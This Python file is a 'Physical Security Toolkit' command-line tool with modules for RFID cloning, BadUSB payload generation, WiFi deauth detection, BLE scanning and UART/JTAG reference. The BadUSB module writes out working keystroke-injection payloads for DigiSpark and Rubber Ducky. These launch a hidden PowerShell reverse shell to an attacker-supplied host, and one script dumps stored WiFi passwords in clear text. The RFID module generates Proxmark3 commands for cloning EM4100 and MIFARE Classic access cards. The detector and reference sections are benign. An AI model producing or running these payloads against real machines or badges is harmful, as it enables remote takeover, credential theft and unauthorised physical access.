#!/usr/bin/env python3
"""
Physical Security Toolkit (~250 lines)
=======================================
1. RFID Cloning Tool (NFC/RFID emulation patterns)
2. BadUSB Payload Generator (DigiSpark/Rubber Ducky)
3. WiFi Deauth Detector (monitor for attacks)
4. Bluetooth Scanner (BLE enumeration)
5. UART/JTAG Pinout Reference

Usage: python physical_security.py <module> [args]
"""

import argparse, sys, time, json
from datetime import datetime
from typing import Dict, List, Optional


# =============================================================================
# 1. RFID Cloning Tool
# =============================================================================

class RFIDCloner:
    """NFC/RFID emulation patterns for access assessment."""

    PROTOCOLS = {
        "125kHz": {"protocols": ["EM4100", "HID ProxCard", "Indala"],
                   "notes": "Easily cloned with Proxmark3"},
        "13.56MHz": {"protocols": ["MIFARE Classic", "DESFire", "ISO 14443A"],
                    "notes": "Classic vulnerable to nested attack; DESFire secure"}
    }

    @staticmethod
    def em4100_pattern(uid: str) -> Dict:
        """Generate EM4100 125kHz emulation pattern."""
        uid = uid.upper().replace(" ", "")
        if len(uid) != 10 or not all(c in "0123456789ABCDEF" for c in uid):
            raise ValueError("EM4100 UID must be 10 hex chars")
        binary = bin(int(uid, 16))[2:].zfill(40)
        rows = [binary[i*4:(i+1)*4] + str(binary[i*4:(i+1)*4].count('1') % 2)
                for i in range(10)]
        return {"protocol": "EM4100", "uid": uid, "frequency": "125 kHz",
                "modulation": "ASK/OOK", "encoding": "Manchester",
                "header": "111111111", "data_rows": rows, "total_bits": 64,
                "proxmark_cmd": f"lf em 410x write {uid}"}

    @staticmethod
    def mifare_clone_script(uid: str) -> str:
        """Generate Proxmark3 MIFARE Classic clone script."""
        uid = uid.upper().replace(" ", "")
        return f"""# MIFARE Classic Clone - UID: {uid}
hf 14a read           # Read original
hf 14a info           # Check magic card
hf mf csetuid {uid}   # Write UID (gen1a/gen2)
# hf mf dump 0 && hf mf restore 0   # Alternative
# hf mf autopwn                      # Auto-pwn unknown keys
"""

    @staticmethod
    def analyze_card(atqa: str, sak: str, uid: str) -> Dict:
        """Identify card type from ATQA/SAK/UID."""
        card_db = {"0004": "MIFARE Classic 1K", "0002": "MIFARE Classic 4K",
                   "0008": "MIFARE Mini", "0018": "MIFARE Classic 4K"}
        sak_db = {"08": "CL1", "18": "CL1 4K", "20": "DESFire"}
        name = card_db.get(atqa.lower().replace(" ", ""), "Unknown")
        return {"card": name, "atqa": atqa, "sak": sak,
                "sak_type": sak_db.get(sak.lower().replace(" ", ""), "?"),
                "uid": uid, "clone_risk": "HIGH" if "Classic" in name else "LOW"}


# =============================================================================
# 2. BadUSB Payload Generator
# =============================================================================

class BadUSBGenerator:
    """Generate DigiSpark (ATTiny85) and Rubber Ducky payloads."""

    @staticmethod
    def digispark_reverse_shell(lhost: str, lport: int = 4444) -> str:
        """DigiSpark ATTiny85 reverse shell payload."""
        return f'''// DigiSpark Reverse Shell - {lhost}:{lport}
#include "DigiKeyboard.h"
void setup() {{
  DigiKeyboard.sendKeyStroke(0); DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell -nop -w hidden -c \\"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$bt=([text.encoding]::ASCII).GetBytes($r2);$s.Write($bt,0,$bt.Length);$s.Flush()}};$c.Close()\\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}}
void loop() {{ digitalWrite(1, !digitalRead(1)); delay(1000); }}
'''

    @staticmethod
    def ducky_reverse_shell(lhost: str, lport: int = 4444) -> str:
        """Rubber Ducky reverse shell payload."""
        return f"""REM Rubber Ducky Reverse Shell - {lhost}:{lport}
DEFAULT_DELAY 100
GUI r
DELAY 500
STRING powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$bt=([text.encoding]::ASCII).GetBytes($r2);$s.Write($bt,0,$bt.Length);$s.Flush()}};$c.Close()"
ENTER
"""

    @staticmethod
    def ducky_wifi_dump() -> str:
        """Rubber Ducky WiFi credential dumper."""
        return """REM WiFi Credential Dumper
DEFAULT_DELAY 100
GUI r
DELAY 500
STRING cmd /c netsh wlan export profile key=clear folder=C:\\temp && powershell -c "Get-ChildItem C:\\temp\\*.xml|%{[xml]$x=Get-Content $_;$n=$x.WLANProfile.name;$k=$x.WLANProfile.MSM.security.sharedKey.keyMaterial;Write-Output \\"SSID: $n | Key: $k\\"}" > D:\\wifi.txt && del C:\\temp\\*.xml
ENTER
"""


# =============================================================================
# 3. WiFi Deauth Detector
# =============================================================================

class WiFiDeauthDetector:
    """Monitor for WiFi deauthentication attacks."""

    DEAUTH_REASONS = {
        1: "Unspecified", 2: "Prev auth invalid", 3: "Leaving BSS",
        4: "Inactivity", 5: "AP overloaded", 6: "Class 2 from non-auth STA",
        7: "Class 3 from non-assoc STA", 8: "Leaving BSS", 9: "Not authenticated"
    }

    def __init__(self, threshold: int = 5, window: int = 10):
        self.threshold, self.window = threshold, window
        self.log: List[Dict] = []
        self.alerts: List[Dict] = []

    def process_frame(self, subtype: int, src: str, dst: str, bssid: str, reason: int) -> Optional[Dict]:
        """Process 802.11 frame. Returns alert if attack detected."""
        if subtype != 12:
            return None
        entry = {"time": time.time(), "src": src, "dst": dst, "bssid": bssid,
                 "reason": reason, "reason_text": self.DEAUTH_REASONS.get(reason, f"?({reason})")}
        self.log.append(entry)
        recent = [e for e in self.log if time.time() - e["time"] <= self.window]
        if len(recent) >= self.threshold:
            sources = {}
            for e in recent:
                sources.setdefault(e["src"], {"count": 0, "targets": set()})
                sources[e["src"]]["count"] += 1
                sources[e["src"]]["targets"].add(e["dst"])
            alert = {"time": datetime.now().isoformat(),
                     "severity": "HIGH" if len(recent) >= self.threshold * 2 else "MEDIUM",
                     "count": len(recent),
                     "attackers": {m: {"count": i["count"], "targets": list(i["targets"])}
                                   for m, i in sources.items()},
                     "mitigation": "Enable 802.11w (PMF), use wired backhaul"}
            self.alerts.append(alert)
            return alert
        return None

    @staticmethod
    def monitor_commands(iface: str = "wlan0mon") -> str:
        """Generate monitoring commands."""
        return f"""# WiFi Deauth Detection - {iface}
sudo tcpdump -i {iface} -e 'type mgt subtype deauth'
sudo tshark -i {iface} -Y 'wlan.fc.type_subtype==0x0c' -T fields -e wlan.sa -e wlan.da
sudo airodump-ng {iface} -w capture
# Scapy: sniff(iface='{iface}', prn=lambda p: p.haslayer(Dot11Deauth) and print(f'Deauth: {{p.addr2}} -> {{p.addr1}}'))
"""


# =============================================================================
# 4. Bluetooth Scanner
# =============================================================================

class BluetoothScanner:
    """BLE device enumeration and analysis."""

    SERVICES = {"1800": "Generic Access", "180a": "Device Info", "180f": "Battery",
                "180d": "Heart Rate", "1812": "HID", "ffe0": "HM-10 UART"}
    COMPANY_IDS = {"0x004c": "Apple", "0x0006": "Microsoft", "0x0059": "Nordic",
                   "0x0075": "Samsung", "0x000D": "TI"}

    @staticmethod
    def scan_commands() -> str:
        """BLE scanning commands."""
        return """# BLE Scan Commands
hcitool scan                   # Classic Bluetooth
sudo hcitool lescan --duplicates  # BLE scan
bluetoothctl scan on           # Interactive BLE
gatttool -b <MAC> --primary    # GATT services
gatttool -b <MAC> --characteristics
# Python: devices = await BleakScanner.discover()
"""

    @staticmethod
    def parse_advertisement(hex_data: str) -> Dict:
        """Parse BLE advertisement packet."""
        data = bytes.fromhex(hex_data.replace(" ", ""))
        result = {"flags": None, "uuids": [], "name": None, "tx_power": None, "manufacturer": None}
        i = 0
        while i < len(data) - 1:
            length = data[i]
            if length == 0 or i + length >= len(data):
                break
            ad_type, ad_data = data[i + 1], data[i + 2:i + 1 + length]
            if ad_type == 0x01:
                result["flags"] = {"limited_disc": bool(ad_data[0] & 0x01),
                                   "general_disc": bool(ad_data[0] & 0x02)}
            elif ad_type in (0x02, 0x03):
                for j in range(0, len(ad_data), 2):
                    u = int.from_bytes(ad_data[j:j+2], 'little')
                    result["uuids"].append(f"0000{u:04x}-0000-1000-8000-00805f9b34fb")
            elif ad_type in (0x08, 0x09):
                result["name"] = ad_data.decode('utf-8', errors='replace')
            elif ad_type == 0x0A:
                result["tx_power"] = int.from_bytes(ad_data, 'little', signed=True)
            elif ad_type == 0xFF and len(ad_data) >= 2:
                cid = int.from_bytes(ad_data[:2], 'little')
                result["manufacturer"] = {"id": f"0x{cid:04x}",
                    "name": BluetoothScanner.COMPANY_IDS.get(f"0x{cid:04x}", "Unknown"),
                    "data": ad_data[2:].hex()}
            i += length + 1
        return result

    @staticmethod
    def classify_device(rssi: int, name: Optional[str]) -> Dict:
        """Classify BLE device and assess risk."""
        result = {"type": "Unknown", "risk": "LOW", "notes": [
            "Very close (<1m)" if rssi > -40 else "Nearby (1-10m)" if rssi > -70 else "Distant (>10m)"]}
        if name:
            nl = name.lower()
            if "airtag" in nl or "tile" in nl:
                result.update({"type": "Tracker", "risk": "MEDIUM", "notes": ["Tracking device present"]})
            elif any(x in nl for x in ["lock", "keypad"]):
                result.update({"type": "Smart Lock", "risk": "HIGH", "notes": ["Access control - assess"]})
            elif "keyboard" in nl or "mouse" in nl:
                result.update({"type": "HID", "risk": "MEDIUM", "notes": ["Potential injection vector"]})
        return result


# =============================================================================
# 5. UART/JTAG Pinout Reference
# =============================================================================

class UARTJTAGReference:
    """Hardware debugging interface reference."""

    UART_STANDARDS = {
        "RS-232 (DB9)": {"TX": 3, "RX": 2, "GND": 5, "RTS": 7, "CTS": 8,
                          "voltage": "±3-15V", "speed": "20 kbps"},
        "TTL UART (3.3V)": {"pins": "VCC, GND, TX, RX, RTS, CTS",
                            "voltage": "0/3.3V", "speed": "115200-3M bps"},
        "CP2102/CH340": {"pins": "5V, 3.3V, GND, TXD, RXD, DTR, RTS",
                         "voltage": "3.3V", "speed": "3M bps"}
    }

    JTAG_PINS = {"TDI": "Data In", "TDO": "Data Out", "TCK": "Clock",
                 "TMS": "Mode Select", "TRST": "Reset", "VREF": "Voltage Ref"}

    JTAG_CONNECTORS = {
        "ARM 20-pin": {1: "VREF", 3: "nTRST", 5: "TDI", 7: "TMS", 9: "TCK",
                       11: "RTCK", 13: "TDO", 15: "nSRST"},
        "ARM 10-pin (SWD)": {1: "VREF", 2: "SWDIO", 4: "SWDCLK", 6: "SWO", 10: "nRESET"},
        "MIPS EJTAG 14-pin": {1: "TDI", 3: "TDO", 5: "TCK", 7: "TMS", 9: "nTRST", 11: "nRST"}
    }

    BOARD_UARTS = {
        "ESP32": {"tx": "GPIO1", "rx": "GPIO3", "baud": 115200, "boot_baud": 74880, "v": "3.3V"},
        "Raspberry Pi": {"tx": "GPIO14(pin8)", "rx": "GPIO15(pin10)", "baud": 115200, "v": "3.3V"},
        "Arduino Uno": {"tx": "Pin1", "rx": "Pin0", "baud": 9600, "v": "5V"},
        "STM32": {"tx": "PA9", "rx": "PA10", "baud": 115200, "v": "3.3V"},
        "CC2541": {"tx": "P0_3", "rx": "P0_2", "baud": 115200, "v": "3.3V"}
    }

    BAUD_RATES = [9600, 19200, 38400, 57600, 115200, 230400, 460800, 921600, 1500000, 3000000]

    @staticmethod
    def detect_baud_script() -> str:
        """Generate baud rate auto-detection script."""
        return '''import serial
BAUDS = [9600, 115200, 57600, 38400, 19200, 74880]
def detect_baud(port):
    for baud in BAUDS:
        try:
            s = serial.Serial(port, baud, timeout=1)
            data = s.read(50); s.close()
            if data and all(32 <= b < 127 or b in (10, 13) for b in data):
                return baud
        except: pass
    return None
'''

    @staticmethod
    def openocd_config(target: str) -> str:
        """Generate OpenOCD config."""
        configs = {"stm32f1x": ("interface/stlink.cfg", "target/stm32f1x.cfg", "STM32F1 via ST-Link"),
                   "esp32": ("interface/ftdi/esp32_devkitj_v1.cfg", "target/esp32.cfg", "ESP32 via FTDI"),
                   "nrf52": ("interface/jlink.cfg", "target/nrf52.cfg", "nRF52 via J-Link")}
        src, tgt, desc = configs.get(target, configs["stm32f1x"])
        return f"""# OpenOCD - {desc}
source [find {src}]
source [find {tgt}]
init
# reset halt | flash write_image erase fw.bin 0x08000000 | step | reg
"""


# =============================================================================
# CLI Interface
# =============================================================================

def main():
    parser = argparse.ArgumentParser(description="Physical Security Toolkit")
    sub = parser.add_subparsers(dest="module")

    p_rfid = sub.add_parser("rfid", help="RFID cloning tools")
    p_rfid.add_argument("--analyze", nargs=3, metavar=("ATQA", "SAK", "UID"))
    p_rfid.add_argument("--em4100", metavar="UID")
    p_rfid.add_argument("--mifare-clone", metavar="UID")

    p_badusb = sub.add_parser("badusb", help="BadUSB payloads")
    p_badusb.add_argument("--digispark", action="store_true")
    p_badusb.add_argument("--ducky", action="store_true")
    p_badusb.add_argument("--lhost", default="192.168.1.100")
    p_badusb.add_argument("--lport", type=int, default=4444)
    p_badusb.add_argument("--wifi-dump", action="store_true")

    p_deauth = sub.add_parser("deauth", help="WiFi deauth detector")
    p_deauth.add_argument("--monitor", action="store_true")
    p_deauth.add_argument("--interface", default="wlan0mon")
    p_deauth.add_argument("--threshold", type=int, default=5)

    p_bt = sub.add_parser("bluetooth", help="BLE scanner")
    p_bt.add_argument("--scan-commands", action="store_true")
    p_bt.add_argument("--parse-adv", metavar="HEX")
    p_bt.add_argument("--classify", nargs=2, metavar=("RSSI", "NAME"))

    p_uart = sub.add_parser("uart", help="UART/JTAG reference")
    p_uart.add_argument("--pinouts", action="store_true")
    p_uart.add_argument("--jtag", action="store_true")
    p_uart.add_argument("--baud-rates", action="store_true")
    p_uart.add_argument("--detect-baud", action="store_true")
    p_uart.add_argument("--openocd", metavar="TARGET")
    p_uart.add_argument("--board", metavar="BOARD")

    args = parser.parse_args()
    if not args.module:
        parser.print_help()
        return

    if args.module == "rfid":
        if args.analyze:
            print(json.dumps(RFIDCloner.analyze_card(*args.analyze), indent=2))
        elif args.em4100:
            print(json.dumps(RFIDCloner.em4100_pattern(args.em4100), indent=2))
        elif args.mifare_clone:
            print(RFIDCloner.mifare_clone_script(args.mifare_clone))
        else:
            print(json.dumps(RFIDCloner.PROTOCOLS, indent=2))

    elif args.module == "badusb":
        if args.wifi_dump:
            print(BadUSBGenerator.ducky_wifi_dump())
        elif args.digispark:
            print(BadUSBGenerator.digispark_reverse_shell(args.lhost, args.lport))
        else:
            print(BadUSBGenerator.ducky_reverse_shell(args.lhost, args.lport))

    elif args.module == "deauth":
        det = WiFiDeauthDetector(threshold=args.threshold)
        if args.monitor:
            print(det.monitor_commands(args.interface))
        else:
            for c, r in WiFiDeauthDetector.DEAUTH_REASONS.items():
                print(f"  {c}: {r}")

    elif args.module == "bluetooth":
        if args.scan_commands:
            print(BluetoothScanner.scan_commands())
        elif args.parse_adv:
            print(json.dumps(BluetoothScanner.parse_advertisement(args.parse_adv), indent=2))
        elif args.classify:
            print(json.dumps(BluetoothScanner.classify_device(int(args.classify[0]), args.classify[1]), indent=2))
        else:
            for u, n in BluetoothScanner.SERVICES.items():
                print(f"  {u}: {n}")

    elif args.module == "uart":
        if args.pinouts:
            print(json.dumps(UARTJTAGReference.UART_STANDARDS, indent=2))
        elif args.jtag:
            print(json.dumps(UARTJTAGReference.JTAG_CONNECTORS, indent=2))
        elif args.baud_rates:
            print("Baud Rates:", ", ".join(str(b) for b in UARTJTAGReference.BAUD_RATES))
        elif args.detect_baud:
            print(UARTJTAGReference.detect_baud_script())
        elif args.openocd:
            print(UARTJTAGReference.openocd_config(args.openocd))
        elif args.board:
            info = UARTJTAGReference.BOARD_UARTS.get(args.board)
            print(json.dumps({args.board: info}, indent=2) if info
                  else f"Boards: {', '.join(UARTJTAGReference.BOARD_UARTS)}")
        else:
            print("JTAG Pins:")
            for p, d in UARTJTAGReference.JTAG_PINS.items():
                print(f"  {p}: {d}")
            print("\nBoard UARTs:")
            for b, i in UARTJTAGReference.BOARD_UARTS.items():
                print(f"  {b}: TX={i['tx']} RX={i['rx']} @ {i['baud']} baud ({i['v']})")


if __name__ == "__main__":
    main()
